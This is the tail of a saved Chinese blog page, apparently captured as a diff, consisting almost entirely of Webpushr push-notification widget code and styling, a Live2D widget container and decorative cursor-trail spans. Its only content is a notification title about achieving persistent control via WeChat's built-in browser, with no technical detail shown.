+            if (typeof (w.webpushr) !== 'undefined') return; w.webpushr = w.webpushr || function () { (w.webpushr.q = w.webpushr.q || []).push(arguments) }; var js, fjs = d.getElementsByTagName(s)[0]; js = d.createElement(s); js.id = id; js.async = 1; js.src = "https://cdn.webpushr.com/app.min.js";fjs.parentNode.appendChild(js);}(window, document, 'script', 'webpushr-jssdk'));webpushr('setup', { 'key': 'BKlorLZnBq1iMFfk3xnjGJjBLNqEm1J1Bi-iRHabMhNYHjT46u-7wQUWjEMij1R6p1CyK6GjOAizKFpbF9XDjYU' });</script><div id="live2d-widget" class="live2d-widget-container" style="position: fixed; right: 0px; bottom: -20px; width: 150px; height: 300px; z-index: 99999; opacity: 0.7; pointer-events: none;"><canvas id="live2dcanvas" width="300" height="600" style="position: absolute; left: 0px; top: 0px; width: 150px; height: 300px;"></canvas></div><!----><div id="webpushr-prompt-wrapper" class="webpushr-subscribed webpushr-notification-denied"><div id="webpushr-bell-optin">
+    <style>
+   promptbox3{line-height:1.1em; position:relative; display:block;}
+   prompticon3{
+    display: inline-block;
+    border-radius: 50%;
+    position: fixed;
+    bottom: 365px;    
+    right: 15px;
+    width: 55px;
+    height: 55px;
+    text-align: center;
+    filter: drop-shadow(0 2px 4px rgba(34,36,38,0.35));
+    z-index: 2147483647;
+    cursor: pointer;
+    box-sizing: border-box;
+    padding: 7px;
+    transform:scale(0.9)
+   }
+
+
+   promptglowingcircle{
+        display: inline-block;
+        border-radius: 50%;
+        width: 55px;
+        height: 55px;
+        text-align: center;
+        z-index: 1;
+        box-sizing: border-box;
+        padding: .45rem;
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        border: #0078ff 1px solid;    
+        animation: circle 1s infinite;
+   }
+   .webpushr-subscribed promptglowingcircle{display:none}
+
+   .webpushr-bell-theme-dark prompticon3{background:#0078ff}
+   .webpushr-bell-theme-light prompticon3{ background:#fff;}
+
+    prompticon3 svg{
+    border-radius: 100%;
+    padding: 0;
+    box-sizing:border-box;
+   }   
+   .webpushr-bell-theme-dark prompticon3 svg{fill:#fff}
+   .webpushr-bell-theme-light prompticon3 svg{fill:#0078ff}
+
+   prompttitle3{
+    background: #000000;
+    color: #ffffff;
+     
+    position: absolute;
+    right: 70px;
+    min-width: 190px;
+    font-size: 13px;
+    padding: 5px 10px 5px 10px;
+    bottom: 12px;
+    border-radius: 8px;   
+    animation-name: title_left;
+    animation-duration: 1.5s;
+    animation-iteration-count: infinite;
+    animation-direction: alternate;
+   min-height:28px;
+   font-family:Arial,Helvetica Neue,Helvetica,sans-serif !important;
+   white-space: nowrap;
+   box-sizing: border-box;
+   }
+
+prompttitle3 prompt3TitleArrow {
+    content: '';
+    width: 10px;
+    height: 10px;
+    display: block;
+    background: #000000;
+    position: absolute;
+    right: -4px;
+    bottom: 9px;
+    transform: rotate(45deg);
+    z-index: -1;
+}
+prompticonimage{
+    display: flex;
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    border: 2px solid #fff;    
+    box-sizing: border-box;
+    align-items: center;
+    justify-content: center;
+}
+
+promptbox3.webpushr-bell-style-Squared prompticon3,promptbox3.webpushr-bell-style-Squared promptglowingcircle{border-radius:10%}
+promptbox3.webpushr-bell-style-Squared prompticonimage{
+    border-radius: 10%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border:none;
+}
+
+   .webpushr-subscribed prompticon3{
+       transform:scale(.62);
+        opacity: .5;
+        box-shadow: none;
+   }
+   .webpushr-subscribed prompticon3.webpushr-new-notification{
+        transform:scale(0.9);
+        opacity: 1;
+   }
+  .webpushr-bell-theme-dark prompticon3 prompticonimage{border-color:transparent;}
+    .webpushr-bell-theme-light prompticon3 prompticonimage{border-color:transparent}
+ 
+   .webpushr-subscribed prompticon3 img{
+       padding:.3em .3em;
+       transition:padding .3s;
+   }
+    prompticon3._Bell.Bottom.Left_bell{left:15px;right:unset;transform-origin: left bottom}
+    prompticon3._Bell.Bottom.Right_bell{transform-origin: right bottom;}
+    prompticon3._Bell.Bottom.Left_bell prompttitle3{left:70px; right:unset;animation-name: title_right;}
+    prompticon3._Bell.Bottom.Left_bell prompttitle3 prompt3TitleArrow{left:-4px;}
+    .webpushr-subscribed prompticon3._Bell.Bottom.Left_bell {transform-origin: left bottom;transition:transform .3s;}
+    .webpushr-subscribed prompticon3._Bell.Bottom.Right_bell {transform-origin: right bottom;transition:transform .3s;}
+
+   .webpushr-subscribed prompttitle3{display:none;}
+
+   promptPopup{
+    position: fixed;
+    bottom: 425px;
+    
+    background: #fff;
+            width: 336px;
+        border-radius: 4px;
+    box-shadow: 0px 0px 10px rgba(0,0,0,.2);
+    font-family: Arial,Helvetica Neue,Helvetica,sans-serif;
+    padding: 10px 10px 10px 10px;
+    z-index: 2147483647;
+    transform:scale(0);
+    transition: transform .2s;
+    box-sizing:content-box;
+    letter-spacing:0.2px;
+   }
+   promptbox3.Left_prompt_popup promptPopup{
+       left: 15px;
+       transform-origin: left bottom
+   }
+   promptbox3.Right_prompt_popup promptPopup{
+       right: 15px;
+       transform-origin: right bottom
+   }
+   promptbox3.Right_prompt_popup popup_close{right:0}
+   promptbox3.Left_prompt_popup popup_close{left:0;}
+   popup_heading{
+    text-align: center;
+    display: block;
+    font-size: 16px;
+    margin-bottom:10px;
+   }
+   popup_heading.popup-button-heading{
+       border-bottom:none;
+                    padding: 10px 0 0px 0;
+            border-top:1px solid #eee;
+            margin-top:10px;
+           }
+   popup_button{
+    display: block;
+    padding: 0px 0 0px 0;
+    text-align: center;       
+   }
+   popup_button btn{
+                   width: 300px;
+            background: #0078ff;
+    margin: 0 auto;
+    padding: 15px;
+    border-radius: 4px;
+    color: #fff;
+    font-family: Arial,Helvetica Neue,Helvetica,sans-serif !important;
+    font-size:16px;  
+    cursor:pointer;
+    display:none;
+    position: relative;
+    line-height:16px !important;
+    box-sizing: content-box;
+   }
+   popup_heading_text{display:none;font-family: Arial,Helvetica Neue,Helvetica,sans-serif;color:#777; line-height:1.2; font-weight:400; letter-spacing:0.2px}
+    .webpushr-subscribed.webpushr-notification-on btn.webpushrOnBtn{display:block; background:#90949c;}
+    .webpushrUnknownBtn{display:block;}
+    .webpushr-subscribed .webpushrUnknownBtn{display:none;}
+    .webpushr-subscribed.webpushr-notification-on .webpushrOnBtn{display:block;}
+    .webpushr-subscribed.webpushr-notification-off .webpushrOffBtn{display:block;}
+    .webpushr-subscribed.webpushr-notification-denied .webpushrDeniedBtn{display:block;}
+    .webpushr-subscribed.webpushr-ackn btn{display:none !important;}
+    .webpushr-subscribed.webpushr-ackn btn.webpushrAcknBtn{display:block  !important;}
+    btn.webpushrUnknownBtn, btn.webpushrOffBtn{background: #0078ff; }
+
+popup_poweredby,popup_poweredby a, popup_poweredby a:hover,popup_poweredby a:active, popup_poweredby a:focus{
+    display: block;
+    text-align: center;
+    font-size: 10px;
+    font-family: Arial,Helvetica Neue,Helvetica,sans-serif;;
+    color:#777 !important;
+    font-weight:400;
+    text-decoration: none;
+    padding-top:4px;
+}
+popup_poweredby *{display:inline-block !important}
+
+popup_close{
+    position: absolute;
+    top: -30px;
+    width: 20px;
+    height: 20px;
+    background: black;
+    display: block;
+    text-align: center;
+    color: #fff;
+    border-radius: 50%;
+    font-family: Arial,Helvetica Neue,Helvetica,sans-serif;
+    box-shadow: 0 0 10px rgba(0,0,0,.2);
+    cursor: pointer;
+    font-size: 10px;
+    padding: 6px;
+    line-height: 0.8;
+    box-sizing: border-box;
+}
+
+   .webpushr-subscribed prompticon3:hover,.webpushr-subscribed .promptBellLarge{
+       transform:scale(0.9);
+       transition:transform .3s;
+        opacity: 1;
+        filter: drop-shadow(0 2px 4px rgba(34,36,38,0.35));
+   }
+   promptPopup.promptPopup-show{
+    transform: scale(1);
+    transition: transform .3s;
+    
+    }
+    .webpushrAcknBtn{font-size:30px;}
+    btn.webpushrOnBtn:after,btn.webpushrOffBtn:after{content:'';width:0;height:0px; background:#fff; position: absolute; left:0;bottom:0;}
+    btn.webpushrBtnWaiting:after{width:100%; height:3px; transition: width 1s;}
+    .webpushr-server-error popup_heading_text.webpushrServerError{display:block;}
+    .webpushr-server-error btn.webpushrAcknBtn{display:block !important; background:#e2232c;}
+    .webpushr-server-error btn.webpushrAcknBtn:after{content:'\2715'; }
+
+    .webpushr-server-success btn.webpushrAcknBtn{display:block !important; background:#15CD72;}
+    .webpushr-server-success btn.webpushrAcknBtn:after{content:'\2713'; }
+
+    .webpushr-subscribed .webpushr-bell-style-Squared prompticon3.Right_bell{right:-2px !important; left:unset; transform:scale(1) !important;     transition: transform .3s, right .3s !important;}
+    .webpushr-subscribed .webpushr-bell-style-Squared prompticon3.Left_bell{left:-2px !important; right:unset;transform:scale(1) !important;     transition: transform .3s, left .3s !important;}
+    .webpushr-subscribed .Right_prompt_popup.webpushr-bell-style-Squared promptpopup{right:25px;}
+    .webpushr-subscribed .Left_prompt_popup.webpushr-bell-style-Squared promptpopup{left:25px;}
+
+    popup_notifications_wrapper{display:block; box-sizing: border-box;}
+popup_notification {
+    position: relative;
+  display: flex;
+    padding: 10px 5px;
+    margin-top: 8px;
+    cursor: pointer;
+    box-shadow: rgb(0 0 0 / 10%) 0px 1px 5px 2px, rgb(0 0 0 / 30%) 0px 0px 2px 0px, #0078ff80 0px 2px 0px 0px inset;
+    border-radius: 10px;
+}
+popup_notification:hover{    background: #f7f7f7;}
+notification_image{
+        display: flex;
+    align-items: center;
+    margin:0 5px;
+}
+notification_image img {
+  width: 105px;
+    float: left;
+    max-height: 50px;
+    display: block;
+    object-fit: cover;
+    border-radius: 7px;
+} 
+notification_body{   
+    display: flex;
+    flex-direction: column;
+    font-size:12px;
+    margin:0 5px;
+}
+notification_title{
+    font-weight: 400;
+    font-size: 15px;
+    max-width: 220px;
+    letter-spacing: 0.2px;
+    font-family: Arial,Helvetica Neue,Helvetica,sans-serif;
+    color: rgb(65 88 255);
+    height: 37px;
+    overflow: hidden;
+    line-height: 18px;
+
+}
+
+notification_time{
+    font-style: italic;
+    font-size: 10px;
+    color: gray;
+    font-family: Arial,Helvetica Neue,Helvetica,sans-serif;
+    letter-spacing: 0.2px;
+    font-weight: 400;    
+    direction:ltr;
+}
+promptnotificationicon{
+    background: red;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    position: absolute;
+    top: -5px;
+    right: -2px;
+    font-family: sans-serif;
+    font-size:12px;
+    z-index:1;
+}
+.Right_prompt_popup.webpushr-bell-style-Squared promptnotificationicon{right:unset;left:-7px}
+@keyframes title_left {
+   0%{right:70px;}
+  50% {right: 75px;}
+  100% {right: 75px;}
+}
+@keyframes title_right {
+   0%{left:70px;}
+  50% {left: 75px;}
+  100% {left: 75px;}
+}
+@keyframes circle{
+    from{transform:scale(1); opacity:1}
+    to{transform:scale(1.5); opacity:0}
+}
+
+prompticon3:hover prompttitle3{display:block;}
+#webpushrDeniedImg{    max-width: 220px;display: block;margin: 0 auto;max-height: 250px;}
+</style>
+
+<promptbox3 class="webpushr-bell-theme-light Bottom Left_prompt_popup webpushr-bell-style-Rounded">
+    <prompticon3 class="webpushr-toggle-bell-popup _Bell Bottom Left_bell">
+        <promptglowingcircle></promptglowingcircle>
+        <prompticonimage><svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 440.832 440.832" style="width:25px; height:35px;" xml:space="preserve"><g><g><path d="M381.44,265.728V161.792C381.44,72.192,309.248,0,219.648,0S58.368,72.192,58.368,161.792v103.936l-41.984,82.944h408.064 L381.44,265.728z"></path></g></g><g><g><path d="M151.552,372.736c0,37.376,30.72,68.096,68.096,68.096c37.376,0,68.096-30.72,68.096-68.096H151.552z"></path></g></g></svg></prompticonimage>  
+                    <promptnotificationicon data-id="Xdww6tCLBJ" style="display: none;">1</promptnotificationicon>
+            </prompticon3>
+    <!-- <prompttitle3 class="prompt_bell_title"><prompt3titletext>Subscribe to receiving push notifications</prompt3titletext><prompt3titlearrow></prompt3titlearrow></prompttitle3> -->
+    <promptpopup class="">
+        <popup_close class="webpushr-toggle-bell-popup">✕</popup_close>
+                    <popup_heading>
+                <popup_heading_text class="webpushrDeniedBtn">下面是您错过的内容</popup_heading_text>
+                <popup_heading_text class="webpushrUnknownBtn">下面是您错过的内容</popup_heading_text>
+                <popup_heading_text class="webpushrOffBtn">下面是您错过的内容</popup_heading_text>
+                <popup_heading_text class="webpushrOnBtn">下面是您错过的内容</popup_heading_text>
+            </popup_heading>
+
+            
+            <popup_notifications_wrapper>
+                                    
+                        <popup_notification class="webpushr-notification" data-id="Xdww6tCLBJ" data-url="https://ailiqun.xyz" data-server="http://206.189.172.205/" data-site="27771">
+                                                        <notification_body>
+                                <notification_title>关于微信内置浏览器 达到持久控制</notification_title>
+                                <notification_time class="notification_time"> 27 minutes ago</notification_time>
+                            </notification_body>
+                        </popup_notification>
+                    
+                            </popup_notifications_wrapper>
+                <popup_heading class="popup-button-heading">
+           <popup_heading_text class="webpushrServerError">Error. Try later.</popup_heading_text>
+           <popup_heading_text class="webpushrDeniedBtn"> 您已阻止推送通知，可以按照以下方法恢复</popup_heading_text>
+           <popup_heading_text class="webpushrUnknownBtn">订阅 开始接收最新文章推送！</popup_heading_text>
+           <popup_heading_text class="webpushrOffBtn">您错过了以下内容</popup_heading_text>
+           <popup_heading_text class="webpushrOnBtn">内容</popup_heading_text>
+        </popup_heading>
+        <popup_button>
+            <webpushrdeniedbtn class="webpushrDeniedBtn"><img id="webpushrDeniedImg" alt="" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/allow_notifications.001-min.png"></webpushrdeniedbtn>
+            <btn id="webpushrUnknownBtn" class="webpushrUnknownBtn">好的</btn>
+            <btn class="webpushrAcknBtn"></btn>
+            <btn id="webpushrOffBtn" class="webpushrOffBtn webpushrActionBtn">订阅</btn>
+            <btn id="webpushrOnBtn" class="webpushrOnBtn webpushrActionBtn">取消订阅</btn>
+         </popup_button>
+                     <popup_poweredby dir="ltr">⚡ by <a href="https://www.webpushr.com/">Webpushr</a></popup_poweredby>
+            </promptpopup>
+</promptbox3>
+</div></div><div id="webpushr-notification-card-wrapper" class=""><style>
+      #webpushr-notification-card-wrapper{
+      width:310px;position: fixed;z-index: 2147483644;  opacity:0;bottom:-70px; right: 10px;
+      transition: opacity .3s, bottom .3s;
+   }
+   #webpushr-notification-card-wrapper popup_close{
+      top: -25px;
+      right: 0;
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      background: black;
+      display: block;
+      text-align: center;
+      color: #fff;
+      border-radius: 50%;
+      font-family: Arial,Helvetica Neue,Helvetica,sans-serif;
+      box-shadow: 0 0 10px rgb(0 0 0 / 20%);
+      cursor: pointer;
+      font-size: 10px;
+      padding: 6px;
+      line-height: 0.8;
+      box-sizing: border-box      
+   } 
+   #webpushr-notification-card-wrapper popup_notifications_wrapper {
+      display: block;
+      box-sizing: border-box;
+      position: relative;
+      margin-top: 25px;
+   }   
+   #webpushr-notification-card-wrapper.show-webpushr-notification-card {
+      
+      opacity: 1;
+      bottom: 30px;
+      transition: opacity .4s, bottom .4s;
+   }   
+   #webpushr-notification-card-wrapper popup_notification{
+      background:#fff;
+      display: flex;
+      padding: 10px 5px;
+      margin-top: 8px;
+      cursor: pointer;
+      box-shadow: rgb(0 0 0 / 10%) 0px 1px 5px 2px, rgb(0 0 0 / 30%) 0px 0px 2px 0px, #0078ff80 0px 2px 0px 0px inset;
+      border-radius: 10px;      
+   }
+   #webpushr-notification-card-wrapper popup_notifications_wrapper.theme-Dark popup_notification{box-shadow: rgb(0 0 0 / 10%) 0px 1px 5px 2px, rgb(0 0 0 / 30%) 0px 0px 2px 0px, #333 0px 2px 0px 0px inset;}
+   #webpushr-notification-card-wrapper notification_image {
+      display: flex;
+      align-items: center;
+      margin:0 5px;
+   }
+   #webpushr-notification-card-wrapper notification_image img {
+      width: 105px;
+      float: left;
+      max-height: 50px;
+      display: block;
+      object-fit: cover;
+      border-radius: 7px;
+   }
+   #webpushr-notification-card-wrapper notification_body {
+      display: flex;
+      flex-direction: column;
+      font-size: 12px;
+      margin:0 5px;
+   }
+   #webpushr-notification-card-wrapper notification_title {
+      font-weight: 400;
+      font-size: 15px;
+      max-width: 220px;
+      letter-spacing: 0.2px;
+      font-family: Arial,Helvetica Neue,Helvetica,sans-serif;
+      color: rgb(65 88 255);
+      height: 37px;
+      overflow: hidden;
+      line-height: 18px;
+   }
+   #webpushr-notification-card-wrapper notification_time {
+      font-style: italic;
+      font-size: 10px;
+      color: gray;
+      font-family: Arial,Helvetica Neue,Helvetica,sans-serif;
+      letter-spacing: 0.2px;
+      font-weight: 400;
+      line-height: 13px;
+   }   
+    #webpushr-notification-card-wrapper .theme-Dark popup_notification{
+        background:#333;
+    }
+    #webpushr-notification-card-wrapper .theme-Dark notification_title{color:#fff;}
+</style>
+<popup_notifications_wrapper class="theme-Light">
+      <popup_close class="" id="webpushr-close-card">X</popup_close>
+               
+            <popup_notification class="" id="webpushr-card-notification" data-id="Xdww6tCLBJ" data-url="https://ailiqun.xyz" data-server="http://206.189.172.205/" data-site="27771">
+                                    <notification_body>
+                     <notification_title> 关于微信内置浏览器 达到持久控制</notification_title>
+                     <notification_time class="notification_time"> 27 minutes ago</notification_time>
+                  </notification_body>
+            </popup_notification>
+         
+      </popup_notifications_wrapper>
+</div><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(27, 135, 152); transform: translate3d(1074.56px, 557px, 0px) scale(0.208333);">*</span><div id="download_plus_animation"></div><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(1041.15px, 544px, 0px) scale(0.316667);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(231, 216, 75); transform: translate3d(1071.43px, 542px, 0px) scale(0.325);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(231, 216, 75); transform: translate3d(1022.24px, 534px, 0px) scale(0.333333);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(987.396px, 520px, 0px) scale(0.341667);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(231, 216, 75); transform: translate3d(997.895px, 503px, 0px) scale(0.35);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(231, 216, 75); transform: translate3d(898.601px, 483px, 0px) scale(0.358333);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(27, 135, 152); transform: translate3d(887.118px, 463px, 0px) scale(0.366667);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(231, 216, 75); transform: translate3d(751.151px, 428px, 0px) scale(0.383333);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(726.395px, 415px, 0px) scale(0.391667);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(27, 135, 152); transform: translate3d(649.673px, 392px, 0px) scale(0.4);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(636.418px, 380px, 0px) scale(0.408333);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(630.625px, 367px, 0px) scale(0.416667);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(625.559px, 359px, 0px) scale(0.425);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(231, 216, 75); transform: translate3d(601.912px, 350px, 0px) scale(0.433333);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(27, 135, 152); transform: translate3d(534.679px, 344px, 0px) scale(0.441667);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(520.874px, 339px, 0px) scale(0.45);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(539.245px, 335px, 0px) scale(0.458333);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(535.578px, 330px, 0px) scale(0.466667);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(27, 135, 152); transform: translate3d(543.848px, 327px, 0px) scale(0.475);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(231, 216, 75); transform: translate3d(504.654px, 325px, 0px) scale(0.483333);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(27, 135, 152); transform: translate3d(521.638px, 322px, 0px) scale(0.491667);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(501.267px, 320px, 0px) scale(0.5);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(27, 135, 152); transform: translate3d(490.078px, 317px, 0px) scale(0.508333);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(231, 216, 75); transform: translate3d(538.966px, 315px, 0px) scale(0.516667);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(214, 28, 89); transform: translate3d(503.279px, 313px, 0px) scale(0.525);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(27, 135, 152); transform: translate3d(496.984px, 312px, 0px) scale(0.533333);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(231, 216, 75); transform: translate3d(501.548px, 311px, 0px) scale(0.541667);">*</span><span style="position: fixed; top: 0px; display: block; pointer-events: none; z-index: 10000000; font-size: 20px; will-change: transform; color: rgb(27, 135, 152); transform: translate3d(528.483px, 310px, 0px) scale(0.55);">*</span></body></html>
